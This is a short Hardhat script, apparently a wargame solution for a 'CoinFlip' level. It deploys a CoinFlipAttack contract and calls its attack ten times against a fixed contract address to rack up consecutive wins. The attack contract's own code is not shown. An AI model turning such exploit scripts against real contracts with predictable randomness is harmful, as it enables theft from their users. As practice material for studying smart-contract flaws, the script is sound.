import { ethers } from "hardhat";
import { CoinFlip__factory } from "../typechain/factories/contracts/CoinFlip__factory";
import { CoinFlipAttack__factory } from "../typechain/factories/contracts/CoinFlipAttack__factory";

async function main() {
    const [signer] = await ethers.getSigners();
    const provider = ethers.provider;
    let instance_address =  "0x54F18306df1Bf91fab2433968918b1447f87c16C";
    let coinflip = new CoinFlip__factory(signer).attach(instance_address);
    console.log(await coinflip.consecutiveWins());


    let attack = await new CoinFlipAttack__factory(signer).deploy();
    await attack.deployed();

    for (let i = 0; i < 10; i++) {
        let tx = await attack.attack(instance_address, {gasLimit:80000});
        await tx.wait();
        console.log(await coinflip.consecutiveWins());
    }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
